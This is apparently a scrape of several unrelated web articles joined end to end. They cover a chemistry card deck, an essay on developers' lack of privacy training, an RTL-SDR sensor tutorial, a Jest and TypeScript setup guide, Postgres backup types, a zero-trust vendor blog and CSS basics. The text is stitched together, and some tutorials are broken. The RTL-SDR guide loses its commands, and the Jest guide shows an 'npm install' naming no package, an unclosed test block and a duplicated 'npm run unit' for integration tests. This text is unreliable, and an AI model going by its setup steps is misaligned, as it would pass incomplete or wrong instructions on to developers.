The deck of 36 <a href="https://www.saul.pw/orgo/mol1.svg">molecule</a> <a href="https://www.saul.pw/orgo/mol2.svg">cards</a> is printed on cardstock. (pdf: <a href="https://www.saul.pw/orgo/mol1.pdf">p1</a> <a href="https://www.saul.pw/orgo/mol2.pdf">p2</a> <a href="https://www.saul.pw/orgo/mol3.pdf">extra</a>)

<br>
The <a href="https://www.saul.pw/orgo/cover.svg">inside cover (svg)</a> is pasted onto the inside of a cigar box.

<br>
Special thanks to Helen Cook for her help in bringing Orgo into existence.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			<p>Last year I gave a talk about <a href="https://webdevlaw.uk/2019/07/22/the-missing-pieces-teaching-the-legal-side-of-web-development/">teaching the legal side of web development</a> to a conference of professional educators, and afterwards, I wrote this:</p>
<blockquote><p><em>Other professionals assume web development is an organised profession with a defined career path like theirs. </em>It is very, very difficult for highly intelligent people working in law and academia, for whom their careers meant three or four years at university, a year or two at graduate school, a full-time position in a professionally structured company, and a clear path of career development, to understand that web development has none of that. They assume we learned certain things, in certain places, at certain times. They assume we receive certain things in the workplace. (They assume we <em>have</em> a workplace). They assume we receive refreshers, CPD, or ongoing training. They assume we are fed regular knowledge by a professional body. To professionals like those, the reality of being a web development practicioner, with no training, guidance, or support, <a href="https://webdevlaw.uk/2018/12/30/lessons-from-the-road-raising-awareness-of-privacy-in-open-source-projects/">is incomprehensible.</a></p></blockquote>
<p>In recent weeks I’ve been seeing a lot of this cognitive bias in play. I’m seeing a lot of highly intelligent professionals who seem to think that improving online privacy is a matter of enhancing training and education that developers already have, or nudging them to pull their socks up where their compliance practices have slipped.</p>
<p>I respect all of these professionals and love working with them, so some tough love is called for here. Please don’t take this the wrong way, but when I see these biases being spoken, it makes me want to put my head in my hands and cry. You need to understand what 24 years of coding on the web, and several years of <a href="https://webdevlaw.uk/speaking/">speaking with, writing for, and training development communities</a> taught me about those professionals:</p>
<p>you can work full time on online privacy and still <em>not actually understand it</em>.</p>
<p>As I write in <a href="https://webdevlaw.uk/book/">my upcoming book,</a> the amount of developers and web practicioners who told me that my conference talks were the first training and education they had ever received on privacy, <em>at all, anywhere, from anyone, ever</em>, was terrifying. That is representative of the field as a global whole.</p>
<p><strong>The overwhelming majority of web practicioners have no training, education, or guidance in online privacy.</strong></p>
<p>At all.</p>
<p>Full stop.</p>
<p>Not one word.</p>
<p>Not one page.</p>
<p>Not privacy as a theoretical concept, not privacy as a legal concept, and not privacy as an ethical concept.</p>
<p>They don’t receive that training from their development communities. They don’t receive that training in their workplaces. They don’t receive that training in their education, assuming they had one.</p>
<p>Nothing.</p>
<p>Yet the bias I described in last year’s post leads many privacy professionals in law and academia to assume that they do, because that’s how <em>their</em> careers panned out. When online privacy goes horribly wrong, they assume there is a level of formative and professional knowledge which web practicioners have deviated from.</p>
<p><strong><em>They never had that to begin with, and no one ever gave them the support they needed to get there</em>.</strong></p>
<p>So I’m seeing law professors talking about adding privacy ethics to the computer science curriculum. To which I would respond: <em>why do you assume the people working with code are going through a university computer science course?</em></p>
<p>For that matter, <em>what curriculum? </em>The developers you need to reach probably came through a 16 week coding academy which taught code and not one word of anything else. Or they’re over 40, like me, and learned everything about code through right-click.</p>
<p>I’m seeing academics wanting to give talks to developers on how they are not meeting legal compliance. To which I would respond: <em>why do you assume that they know what they are meant to be compliant with? Who do you believe they received that education from?<br>
</em></p>
<p>I’m seeing privacy professionals saying we need to rethink how we train technologists. To which I would say: <em>why do you assume that technologists have any training?</em></p>
<p>I’m seeing data protection professionals wagging their fingers at developers to wise up. To which I would say: <em>Good for you, but you’re pointing fingers, and not offering one hand up of the practical support they need to make you happy.</em></p>
<p>So let’s talk about what you need to do, as a full time legal or academic professional working in online privacy, if you want to get the message through on the ground, at the grassroots, and where it matters.</p>
<p>Because this is what is standing inbetween you, the makers of the web, and the people we build the web for.</p>
<p>You need to be prepared to commit to online privacy as a completely voluntary, unpaid, unfunded, unreimbursed, unsupported, unwanted, and unappreciated endeavour.</p>
<p>You need to be prepared to accept that you will be doing this work for the benefit of the open web and the people we build it for, and that this work will not benefit your career, your CV, your professional reputation, or your personal standing in the slightest. Just the opposite.</p>
<p>You need to understand that you are entering a world where the schools you went to, the degrees after your name, the institutions which employ you, and the works on your CV mean absolutely nothing to anyone, and <del>f***k you</del> god help you if you think they should.</p>
<p>You need to get your feet under the table with open source privacy teams, in open source projects which aren’t too bothered about online privacy, and spend several years getting dirty in the trenches with them before you purport to give them a single word of academic or legal advice.</p>
<p>You need to be prepared to spend £400-£800 out of pocket on travel and accommodation, several times a year, to give privacy talks at software community conferences which don’t cover speaker expenses, to speak with fewer than 20 people in the Sunday morning hangover slot.</p>
<p>You need to be prepared to put weeks of work into those conference talks, where the only question you will get afterwards is “do we still have to do those cookie popups.”</p>
<p>You need to be prepared to have your work misconstrued, your character torn down, and your credibility attacked by aggressive, angy tech bro developers who associate the word “privacy” with foreign government interference in their personal freedoms, and see you as that government’s emissary.</p>
<p>You need to be prepared to attend a data protection conference so that you can speak with a privacy lawyer about ways he might be able to support your development communities, only for him to zip out as soon as his talk is finished and then patronise you as some silly kid when you try to engage on social media.</p>
<p>You need to be prepared to have to crowdfund to cover your out-of-pocket privacy expenses, and just maybe, the time you spend on privacy teams at a level equivalent to the national minimum wage, only to be accused of just wanting to do it for the money.</p>
<p>Ditto for the months of work you pour into funding and grant applications to support development communities to establish and strengthen privacy teams and initiatives, and when you don’t get the funding, it’s the projects you <em>put in the application to support</em> which accuse you of wanting to do it for the money.</p>
<p>You need to be prepared to have to put aside privacy work for a few months to plow through internal project dramas and soap operas which are preventing the privacy work from being able to go ahead.</p>
<p>You need to be prepared to ask people to give you favours like downloads of academic papers off of university networks, or resources out of paid membership clubs like IAPP, because you can’t afford membership dues much less an academic shibboleth.</p>
<p>You need to be prepared to have everyone hate you – I mean, <em>really, really despise every bit of you, personally</em> – for what you do.</p>
<p>And you need to be prepared to grow another layer of skin and keep on doing it.</p>
<p>So if you care about online privacy and want to make the web a better place, please take that as the tough love as it is. Otherwise, you’re fighting the wrong battle with the wrong weapons. And just maybe, you’re fighting on the wrong side.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><h2 id="introduction">Introduction</h2>
<p>I was always interested in the RF world, the fact that we are surrounded by an infinite amount of invisible waves that carry information is intriguing. A lot has changed over the years, the technology advanced and today you can easily dive into the electromagnetic realm without fiddling with mountains of equipment and burning your pocket.</p>
<p>In this post we’ll explore using RTL-SDR to read live temperature and humidity stats from cheap 433.92Mhz modules, feeding them to InfluxDB using rtl_433, MQTT and Telegraf on a Raspberry Pi (but any Linux based device can work)</p>
<h2 id="hardware">Hardware</h2>

<p>The definition of SDR is “Software Defined Radio”, it’s a radio-communication system where instead of using components that were traditionally implemented in hardware - software is used, allowing greater flexibility and reducing costs.</p>
<p>RTL-SDR is a high quality USB dongle (but relatively cheap at ~$25) that can be used to scan and receive radio signals from 500Khz (24Mhz for the device I used) up to 1.75Ghz. It was designed and built by the awesome dudes over at <a href="https://www.rtl-sdr.com/about-rtl-sdr/" target="_blank" rel="noopener noreffer">RTL-SDR.com</a> based on DVB-T TV tuner dongles. I ordered <a href="https://www.amazon.com/gp/product/B011HVUEME/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B011HVUEME&amp;linkCode=as2&amp;tag=rsv0f-20&amp;linkId=b3bd3c48a6a7e921144609cb59359f0e" target="_blank" rel="noopener noreffer">this</a> kit which included two modular dipole antennas.</p>

<p>Almost any RF based wireless thermometer / humidity sensor is probably readable by <code>rtl_433</code>. Since we’re talking about cheap hardware you can’t really get any assurances, checking the RF frequency is probably enough - if it says 433.92Mhz, you are 99% good.

<h2 id="software">Software</h2>
<p><strong><a href="https://cubicsdr.com/" target="_blank" rel="noopener noreffer">CubicSDR for MacOS</a></strong></p>
<p>This is an awesome free open-source software for SDR. It wasn’t easy finding one for MacOS, most of the commonly-used projects are made for Linux and Windows. It’s not really required for decoding 433.92Mhz signals, but I wanted to get my hands dirty and look on live RF, it’s pretty neat (and of course to test the device is actually working!)</p>
<p><strong><a href="https://github.com/merbanan/rtl_433" target="_blank" rel="noopener noreffer">rtl_433</a></strong></p>
<p>An amazing project that can be used to decode a variety of RF-based devices on various frequencies (433.92 MHz, 868 MHz, 315 MHz, 345 MHz, and 915 MHz ISM bands). This is the software that does the heavy lifting.</p>
<p><strong><a href="https://github.com/eclipse/mosquitto" target="_blank" rel="noopener noreffer">Mosquitto</a></strong></p>
<p>Very simple MQTT server and client implementation, we’ll be using that as the output of rtl_433 and input of Telegraf to stream the metrics to a remote InfluxDB instance.</p>
<p><strong><a href="https://github.com/influxdata/telegraf" target="_blank" rel="noopener noreffer">Telegraf</a></strong></p>
<p>Agent for collecting and writing metrics. It will subscribe to our MQTT queue, parse and transmit the metrics to InfluxDB.</p>

<p>Let’s start by quickly testing our shiny RTL-SDR receiver, I’ve used the two short 5cm dipole telescopic antennas for this test, you should definitely read <a href="https://www.rtl-sdr.com/using-our-new-dipole-antenna-kit/" target="_blank" rel="noopener noreffer">this great guide</a> that the awesome dudes over at rtl-sdr.com wrote on using the provided antennas. The antenna used is critical for getting high-quality signal in some cases. For our radio FM test any antenna will probably suffice, but if you want to receive <a href="http://happysat.nl/Setup_Meteor/Setup.html" target="_blank" rel="noopener noreffer">weather satellite signal running on 137Mhz</a>, you’ll have to be more specific.</p>
<p>Hopefully you’ve ended up with something like this:</p>

<h3 id="listening-to-radio">Listening to radio</h3>
<p>Now you can connect the dongle to your usb port, launch CubicSDR, choose “Generic RTL2832U OEM” and hit “Start”, you can ignore the extra settings you see on the right for now. You should see a pretty moving signal heatmap, you can change the center frequency by hovering over it and tapping space (the key), I chose a local FM radio station that is broadcasting on 88Mhz (FM).</p>
<p>Now your bandwidth setting should be set to 200Khz, you should get a nice signal and when you hover your mouse over it the band will “encapsulate” the signal, click and you should start hearing radio!</p>
<h3 id="checking-frequency-43392mhz">Checking Frequency 433.92Mhz</h3>
<p>Let’s get ready to use <code>rtl_433</code> by looking at the frequency and making sure there are devices there. Usually they will transmit information in 30 second bursts, you can change the center frequency to 433.92Mhz and check that you see data. Near the end of the video above you can see the signal bursts when I switch to 433.92Mhz</p>

<p>I’m assuming you have a working Raspberry Pi with SSH access running Raspbian.

<p>So we’re getting live sensor data, that’s pretty awesome, let’s stream everything to InfluxDB. You can open a free <a href="https://cloud2.influxdata.com/signup" target="_blank" rel="noopener noreffer">Influx Cloud</a> account and we’ll configure Telegraf to stream information to it, after you open the account generate an API key for your bucket.</p>
<p>We’ll use Eclipse Mosquitto as the MQTT server, it’s a very lightweight implementation of MQTT server, providing simple pub/sub service which we’ll use.</p>

</div><p>You’ll need to get your InfluxDB endpoint url, token, organization name and bucket from Influx cloud. The MQTT consumer settings specifies connecting to our MQTT server and listening to rtl_433/# topic, which basically says any topic with the prefix rtl_433/ will be sent to InfluxDB.</p>
<p>The expected data should be json (as specified by the <code>data_format</code> option)</p>
<h3 id="running-rtl_433">Running rtl_433</h3>
<p>Now for the last part, just run rtl_433 with mqtt output!, to make sure everything works you can first run a mosquitto subscription client and listen to incoming events by running <code>mosquitto_sub -t "rtl_433/#"</code>, afterwards launch it (I like using screen for that, see the next video):</p>

<p>If all went well data should be flowing to InfluxDB! hurrah!</p>
<h2 id="viewing-your-data">Viewing your data</h2>
<p>Using InfluxDB is outside the scope of this post but you should be able to get funky graphs like this one:</p>

<p>Using RTL-SDR for decoding RF data is only the tip of the iceberg of what you can do with it, I highly suggest going to <a href="https://www.rtl-sdr.com/" target="_blank" rel="noopener noreffer">rtl-sdr.com</a> and checking some of their amazing tutorials - You can receive live weather satellite data, decode trunked radio systems and see the universe!</p>

<h2 id="prerequisites">Prerequisites</h2>
<p>If you are following along, <a target="_blank" rel="noopener noreferrer" href="https://hashnode.blainegarrett.com/building-a-github-repo-template-part-2-eslint-with-typescript-ckcnxtgm000aekls112id1qv7">please complete part 2 of the series</a>. I am immediately picking up where that post left off. </p>
<h2 id="writing-a-simple-function-to-test">Writing a Simple Function To Test</h2>
<p>Thus far, we've only dealt with Next.js page components, which have to live within the <em>/pages</em> directory in the project root. We'll introduce a <em>/src</em> folder to the project root and create a <em>utils</em> folder that will contain <em>add.ts</em> that will export a simple function to test. Using the nested folders will help us ensure that glob patterns are working later with Jest test matching.</p>
<pre><code>


<span>const</span> add = (a: <span>number</span>, b: <span>number</span>): <span><span>number</span> =&gt;</span> a + b;
<span>export</span> <span>default</span> add;
</code></pre><h2 id="writing-our-test">Writing our Test</h2>
<p>Even though we have not yet installed Jest, we can still write our test. In a way we are using Test Driven Design thinking to ensure our test setup works. In the <em>src/utils/</em> create a file <em>add.test.ts</em></p>
<pre><code><span>//</span> src/utils/add.test.ts

import add from <span>'./add'</span>;

describe(<span>'adding two numbers should'</span>, <span><span>()</span> =&gt;</span> {
  test(<span>'return expected when both args are non 0'</span>, <span><span>()</span> =&gt;</span> {
    expect(add(<span>1</span>, <span>2</span>)).toEqual(<span>5</span>);
  });
  test(<span>'return 0 when both args are 0'</span>, <span><span>()</span> =&gt;</span> {
    expect(add(<span>0</span>, <span>0</span>)).toEqual(<span>5</span>);
  });
  test(<span>'return expected when both args trigger floating point error'</span>, <span><span>()</span> =&gt;</span> {
    expect(add(<span>0.1</span>, <span>0.2</span>)).toEqual(<span>5</span>);
  });
});
</code></pre><p><em>Note:</em> These tests are expected to fail when run as the expected value is 5. This is Test Driven Design thinking. Once we see them fail, we know they are being run and fixing them is trivial. I'll write a series about unit testing later. </p>
<p>If you have ESLint set up properly from the previous post, you should see some errors in your IDE highlighted as per below. As per the previous post, I am using VSCode.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1594911206466/b6qUklRnI.png?auto=format&amp;q=60" alt="Screen Shot 2020-07-16 at 9.53.10 AM.png"></p>
<p>This is due to TypeScript not knowing the types for <em>describe</em>, <em>test</em>, and <em>expect</em>. So let's install Jest and Jest Type Definitions to clean that up.</p>
<h2 id="installing-jest-and-types">Installing Jest and Types</h2>
<p>To install Jest and the associated Types, simply run the following in the terminal</p>
<pre><code><span>npm</span> install --save-dev jest @types/jest
</code></pre><p>Once installed, the ESLint errors go away in your IDE
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1594911289203/Zy6NiIFFr.png?auto=format&amp;q=60" alt="Screen Shot 2020-07-16 at 9.54.36 AM.png"></p>
<h2 id="running-tests-with-jest">Running Tests with Jest</h2>
<p>We have some code, we have a test for that code, and we've installed Jest. However, we can't actually run our tests yet. Let's set that up next.</p>
<p>Update the test command in package.json from</p>
<pre><code>    <span>"test"</span>: <span>"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>
</code></pre><p>to </p>
<pre><code>    <span>"test"</span>: <span>"jest --collectCoverage true"</span>,
</code></pre><p>We can now run our tests by typing the following in the command line</p>
<pre><code>npm run <span>test</span>
</code></pre><p>This will likely complain with an error like: 
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1594915495398/qrxLq4enb.png?auto=format&amp;q=60" alt="Screen Shot 2020-07-16 at 11.04.26 AM.png">
The reason for the error is that Jest doesn't know how to deal with TypeScript yet. Even though we have installed the Types, Jest needs some additional dependencies and configuration.</p>
<h2 id="configuring-jest-for-typescript">Configuring Jest for TypeScript</h2>
<p>We need to tell Jest how to deal with TypeScript. </p>
<p>Run the following in the terminal to install TypeScript support for Jest</p>
<pre><code>npm <span>install</span> 
</code></pre><p>Once installed, add the following top level directive to your <em>package.json</em></p>
<pre><code>  <span>"jest"</span>: {
    <span>"moduleFileExtensions"</span>: [
      <span>"js"</span>,
      <span>"json"</span>,
      <span>"ts"</span>
    ],
    <span>"rootDir"</span>: <span>"src"</span>,
    <span>"testRegex"</span>: <span>".test.ts(x?)$"</span>,
    <span>"transform"</span>: {
      <span>"^.+\\.ts$"</span>: <span>"ts-jest"</span>
    },
    <span>"collectCoverageFrom"</span>: [
      <span>"**/*.{ts,tsx}"</span>
    ],
    <span>"moduleNameMapper"</span>: {
      <span>"~/(.*)$"</span>: <span>"&lt;rootDir&gt;/<span>$1</span>"</span>
    },
    <span>"coverageDirectory"</span>: <span>"../coverage"</span>,
    <span>"testEnvironment"</span>: <span>"jsdom"</span>,
    <span>"resetMocks"</span>: <span>true</span>
  }
</code></pre><p><strong>Note:</strong> This config could live in a separate <em>jestconfig.json</em> file. However, jest supports putting config in the <em>package.json</em> so why clutter up the project directory.</p>
<p>Jest should now be ready to run your tests written in TypeScript. Try it, by running </p>
<pre><code>npm run <span>test</span>
</code></pre><p>If you see the following, celebrate! </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1594915054534/qa9QmCOtd.png?auto=format&amp;q=60" alt="Screen Shot 2020-07-16 at 10.57.13 AM.png"></p>
<p>The tests failed, but they ran! Update the tests to pass by changing the expected value to what logically makes sense. Note that nasty floating point test...</p>
<pre><code>import add from <span>'./add'</span>;

describe(<span>'adding two numbers should'</span>, <span><span>()</span> =&gt;</span> {
  test(<span>'return expected when both args are non 0'</span>, <span><span>()</span> =&gt;</span> {
    expect(add(<span>1</span>, <span>2</span>)).toEqual(<span>3</span>);
  });
  test(<span>'return 0 when both args are 0'</span>, <span><span>()</span> =&gt;</span> {
    expect(add(<span>0</span>, <span>0</span>)).toEqual(<span>0</span>);
  });
  test(<span>'return expected when both args trigger floating point error'</span>, <span><span>()</span> =&gt;</span> {
    expect(add(<span>0.1</span>, <span>0.2</span>)).toEqual(<span>0.30000000000000004</span>);
  });

<h2 id="separating-unit-and-integration-tests">Separating Unit and Integration Tests</h2>
<p>I am a big fan of Test Driven Design. I'm also a big fan of separating unit tests from other slower types of tests. Personally, if running unit tests is slow, I believe people (myself included) skip TDD and/or skip writing tests all together. For that reason, I tend to prefer unit tests to be very simple and able to be ran independently of other tests. Python's nose test runner used to have a simple class tag approach to this, but we can leverage Jest's filename matching to accomplish the same.</p>
<p>I will introduce two additional scripts to the <em>package.json</em>:</p>
<pre><code>    <span>"unit"</span>: <span>"jest --testRegex '(?&lt;!integration\\.)test\\.ts(x?)$'"</span>,
    <span>"integration"</span>: <span>"jest --testRegex 'integration\\.test\\.ts(x?)$'"</span>,
</code></pre><p>With these in place, I have 3 test commands:</p>
<ol>
<li><code>npm run unit</code> will run all unit test (those not ending in <code>integration.test.ts(x?)</code>)</li>
<li><code>npm run unit</code> will run all the slower integration tests.</li>
<li><code>npm run test</code> will run all tests AND generate a coverage report (which isn't necessary normally during normal dev)</li>
</ol>

<p>At this point, our Github Template repository contains a Next.js application written in TypeScript that obeys airbnb formatting rules without any errors, and has Jest testing set up. <a target="_blank" rel="noopener noreferrer" href="https://github.com/blainegarrett/react-next-material-typescript-template/compare/0.0.2...0.0.3">View the full changeset covered in this post</a> or check out the <a target="_blank" rel="noopener noreferrer" href="https://github.com/blainegarrett/react-next-material-typescript-template/releases/tag/0.0.3">0.0.3 release of the repository</a>.</p>
<p>This is a great starting point for most projects, but we're going to do a bit more in the next post by adding module aliases.</p>

July 17, 2020 | https://supabase.io/blog/2020/07/17/postgresql-physical-logical-backups | <a href="https://web.archive.org/web/*/https://supabase.io/blog/2020/07/17/postgresql-physical-logical-backups">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>PostgreSQL backups can be categorized into two types: <em>logical</em> and <em>physical</em>. This post briefly covers each type and discusses the situations where you would use either one.</p><p>We'll cover some of the many tools you can use for Postgres backups in future posts.</p><h2>Logical Backups</h2><p>This form of backup is typically achieved by <a href="https://www.postgresql.org/docs/current/backup-dump.html">translating all the data into a set of SQL commands and writing it into a single file</a>. This can then be fed to any database cluster to recreate everything. In your CLI, performing logical backups can be as easy as:</p><div><div><div tabindex="0"><div><p><span>pg_dump db_name </span><span>&gt;</span><span> file_name.sql</span></p></div></div></div></div><p>for a single database, and:</p><div><div><div tabindex="0"><div><p><span>pg_dumpall </span><span>&gt;</span><span> file_name.sql</span></p></div></div></div></div><p>for an entire database cluster. Both the <a href="https://www.postgresql.org/docs/current/app-pgdump.html">pg_dump</a> and <a href="https://www.postgresql.org/docs/current/app-pg-dumpall.html">pg_dumpall</a> utilities have their respective additional options for you to choose from and set up your desired logical backup setting. Recovering from them is comparably as simple:</p><div><div><div tabindex="0"><div><p><span>psql -d db_name -f file_name.sql</span></p></div></div></div></div><h3>What is it good for?</h3><h4>Simpler and quicker way of performing backups</h4><p>As shown above, a single command is enough to perform a logical backup and another to recover from it. As a novice with databases, this would be an ideal and non-intimidating ensure that your database is backed up at all times.</p><h4>Migration between different major versions of Postgres</h4><p>If you are planning to migrate to a different major version of Postgres (for example, from Postgres 11 to Postgres 12), logical backups via <code>pg_dumpall</code> would surely be your <a href="https://www.postgresql.org/docs/current/upgrading.html">tool of choice</a>. This is mainly because internal data storage formats may differ between major versions. This is the basis of physical backups, eliminating it as an option when upgrading. We'll go deeper into migrations and how to perform them in another post.</p><h4>Backing up a single specific database</h4><p>With <code>pg_dump</code>, you can constantly back up a single, targeted database.</p><h2>Physical Backups</h2><p>Physical backups pertain to the actual set of files or file systems where your database data is stored. One option for physical backups involves <a href="https://www.postgresql.org/docs/current/backup-file.html">taking a snapshot</a> of your data files by making a copy of them.</p><h3>What is it good for?</h3><h4>More ideal for larger databases</h4><p>As your database grows to the size of a few gigabytes, backing it up through physical backups is more ideal than through logical backups. As explained <a href="https://devcenter.heroku.com/articles/heroku-postgres-data-safety-and-continuous-protection#the-performance-impact-of-logical-backups" target="_blank" rel="noopener noreferrer">here</a>, over time, performing logical backups in large databases could lead to degraded performance for other queries. Given the long run time as well to successfully perform a logical backup on a large database, errors have a higher chance of occurring, making the eventual backup unusable.</p><h4>Achieving Point in Time Recovery</h4><p>Postgres also generates <a href="https://www.postgresql.org/docs/current/wal-intro.html">Write Ahead Log</a> (WAL) files, which can be used together with a backed-up file system to <a href="https://www.postgresql.org/docs/current/continuous-archiving.html">recover a database up to any chosen point in time</a>. When disaster strikes, this is one of the best options for recreating your database up to the point right before the unfortunate happens. This greatly minimizes <a href="https://www.ibm.com/services/business-continuity/rpo" target="_blank" rel="noopener noreferrer">Recovery Point Objective (RPO)</a> along the way. Even better, tools such as <a href="https://github.com/wal-g/wal-g" target="_blank" rel="noopener noreferrer">WAL-G</a> are readily available to simplify the steps involved in setting this up.</p><h2>Conclusion</h2><p>All in all, logical and physical backups are generated differently from one another. Neither has an advantage over the other. Depending on your needs, each brings unique uses to the table:</p><table><thead><tr><th>Logical</th><th>Physical</th></tr></thead><tbody><tr><td>Simpler way of getting started with backups.</td><td>Better way of handling backups for larger database clusters.</td></tr><tr><td>Using it to migrate between different major versions of Postgres.</td><td>Using it for Point in Time Recovery.</td></tr><tr><td>Having the option to back up a single database.</td><td></td></tr></tbody></table></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span><span>Reading Time: </span> <span>3</span> <span>minutes</span></span></p><p><span>The word trust is a common theme in cybersecurity when it comes to network breaches, yet the idea of lack of trust is what’s highlighted in these breaches. A company’s feeling of safety and security can disappear in a nanosecond once their network has been infiltrated, and all control of networks and applications is lost. For all tech-forward organizations, the feeling of lost control becomes more universal with every new breach to hit the headlines.</span></p>
<p><span>While in some industries this scary feeling may be up and coming, in the network security landscape it is not a new phenomenon. Whether from malware, ransomware, or your classic unauthorized access network breach </span><a href="https://www.perimeter81.com/blog/news/the-capital-one-data-breach-how-crisis-could-have-been-averted/"><span>like we saw with Capital One</span></a><span>, zero optimism is entertained concerning the safety of companies and individuals from hackers. Awareness of one’s level of a vulnerability is a prerequisite to safety and enables one to take pragmatic steps to secure their data.&nbsp;</span></p>
<h2><span>Rethink the Approach for Network Security&nbsp;</span></h2>
<p><span>Until recently, the organization’s IT and security teams primarily focused all their security efforts on fighting off different attacks on the perimeter. While this was the right approach when everyone worked in the same office, times have changed. Due to COVID-19 accelerating the “work from anywhere” approach, we need to rethink network security strategies and pivot them around the user instead of where the network is based.&nbsp;</span></p>
<p><span>With more employees working outside the physical office, there is a quickly growing number of endpoints for hackers to attack. In most organizations, the typical employee uses multiple devices to do their daily job. Is each device secure? The answer is probably yes – but you can’t be certain. With each unsecured every device, organizations’ networks are taking an unnecessary risk. When networks are breached, the process of understanding where and how access was gained is not instant and by the time you have your answers, it is too late.</span></p>
<p><span>IT and security teams need to change their approach, and instead of solely emphasizing perimeter security, transform their employees’ permissions and access policies. One of the most common mistakes organizations make is trusting their users when it comes to authorized access. When you provide unrestricted access to any user or device in your network, you simply open the gates for your organization’s network to be breached.&nbsp;</span></p>
<p><span>Once a user or organization is compromised, their credentials can easily be used to infiltrate the network, especially with different attacks. This presents the idea that organizations need to have better visibility when it comes to authorized user access to their network. So how can organizations trust their employees once again?</span></p>
<h2><span>Zero Trust Helping Us Trust Again&nbsp;</span></h2>
<p><span>Can we trust our employees once again, and reduce their responsibility and impact as guards of the organization’s network against hackers? I believe we can, as humans are meant to be trusted even though in many instances human error puts that trust in doubt. People aren’t perfect, we all make mistakes, but we must account for them proactively.</span></p>
<p><span>A common approach that has gained popularity over the past decade for secure network access is by implementing the <a href="https://www.perimeter81.com/solutions/zero-trust-security">Zero Trust model</a>. Zero Trust was </span><span>originally proposed by Forrester in 2010, with the motto </span><span>“never trust, always verify”. This is the idea that until the user can verify him or herself via authentication, they will not receive access to the network. </span><span>Adopting Zero Trust is not a specific product or architecture, instead, it’s taking a more modern approach of setting up organization-wide guidelines inside the company’s resources.&nbsp;</span></p>
<p><span>By implementing the ZTNA model for secure network access, IT teams will have full control over who is granted access, enters and leaves the network at all times. For each network, resource or application, there should be a set of rules and policies in place enforced by the key elements of the Zero Trust model: multi-factor authentication, proper device management, limited privileged access and network segmentation using software-defined architecture.</span></p>
<h2><span>ZTNA The Approach Not the Model&nbsp;</span></h2>
<p><span>Organizations that take the right approach with ZTNA can erase the concept of trusting in their employees and won’t fear to grant access. To achieve secure network access inside your organization you will need to have the proper principles implemented and distributed throughout the company. Treat </span><a href="https://www.perimeter81.com/zero-trust-network-access"><span>Zero Trust Network Access</span></a><span> as a manual for how organizations should strategize and “trust” their employees with the keys to the kingdom.&nbsp;</span></p>

                    <section>
                <p>I learned how to build websites the old fashioned way: looking at website source code and trying to replicate the things I saw. I threw in the odd book for the stuff I couldn’t <em>see</em> (like PHP/MySQL), and I was on my way.</p>

<p>This was back in 1999, when we’d write things like <code>&lt;font size="4" color="#000000"&gt;</code> and DHTML was a <em>thing</em>.</p>

<p>When CSS came along my approach to learning didn’t differ. But I <em>really</em> wish I’d taken the time to learn CSS properly: there was so much fundamental stuff I missed.</p>

<p>Here are some things I didn’t know that I wish I’d learned earlier.</p>

            </section>

                <p>Even though I <em>knew</em> about these properties, I didn’t fully understand them for a long time.</p>

<p>Here’s a breakdown:</p>

<ul>
<li><code>block</code> elements expand horizontally to take up a whole line (like a heading). We can apply vertical margin to these.</li>
<li><code>inline</code> elements expand horizontally just enough to contain their content (like <code>strong</code> or <code>em</code> elements). We <strong>cannot apply vertical margins to these</strong> and they should usually be placed inside a <code>block</code> element.</li>
<li><code>inline-block</code> elements are like <code>inline</code> elements, <strong>but you can apply vertical margins to these</strong> (making them useful for things like buttons).</li>
</ul>

<p>In the example below, <code>block</code> elements have a blue border, <code>inline</code> elements have an orange background, and our <code>inline-block</code> element has a red border.</p>

                <p>Images <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img#Styling_with_CSS">being inline by default</a> isn’t a problem, but it can cause confusion when trying to position them or add vertical margins.</p>

<p>If your CSS reset doesn’t include this already, I’d suggest adding the following rule:</p>

<pre><code>img {
    display: block;
}
</code></pre>

<p>That will make their behaviour much more predictable. You might also want to add <code>max-width: 100%;</code> to stop them breaking out of their container, too.</p>

                    <section>
                <p>By default, the width/height of a box is calculated by adding together the dimensions of the:</p>

<ul>
<li>Content area</li>
<li>Padding area</li>
<li>Border area</li>
</ul>

<p>This isn’t usually a problem for an element’s height: we’re usually not too bothered about how content reflows vertically. The problems usually occur when trying to calculate an element’s width, especially if there’s more than one element in a row.</p>

<p>If we had the following CSS:</p>

<pre><code>.some-class {
    width: 50%;
    padding: 2em;
    border: 0.1rem;
}
</code></pre>

<p>The total calculated <code>width</code> for <code>.some-class</code> would be:</p>

<p><code>50% + 4em + 0.2rem</code></p>

<p>That’s because of a property called <code>box-sizing</code> which has a default value of <code>content-box</code>. This value means the <code>width</code> property <strong>applies to the content area</strong>: everything else is added on top of this.</p>

<p>We can change this for all elements with the following rule:</p>

<pre><code>* {
    box-sizing: border-box;
}
</code></pre>

<p>Returning to our example, the element’s width would now apply to the <code>border</code>, so our element’s total <code>width</code> would be <code>50%</code>.</p>

<p>What happens to the <code>border</code> and <code>padding</code>? Those properties/values still apply, but they don’t affect the total <code>width</code> of the element: they sit within the defined area.</p>

                    <p>We haven’t discussed <code>margin</code> here because <strong>margin is the space between elements</strong>. For that reason, it is never part of this calculation.</p>

                <p>If an element has no <code>background</code> or <code>border</code>, it can appear that <code>padding</code> and <code>margin</code> are the same. They are not!</p>

<ul>
<li><code>margin</code> is the space <strong>between</strong> elements</li>
<li><code>padding</code> is space <strong>inside</strong> an element</li>
</ul>

<p>That makes <code>padding</code> useful for elements that have a <code>background</code>. We often don’t want the content to be close to the edge of the element’s box and <code>padding</code> helps us achieve that.</p>

                <p>This has been the source of frustration for CSS newcomers for a long time. Rachel Andrew <a href="https://www.smashingmagazine.com/2019/07/margins-in-css/#margin-collapsing">describes the behaviour</a> as:</p>

<blockquote>
  <p>When margins collapse, they will combine so that the space between the two elements becomes the larger of the two margins. The smaller margin essentially ending up inside the larger one.</p>
</blockquote>

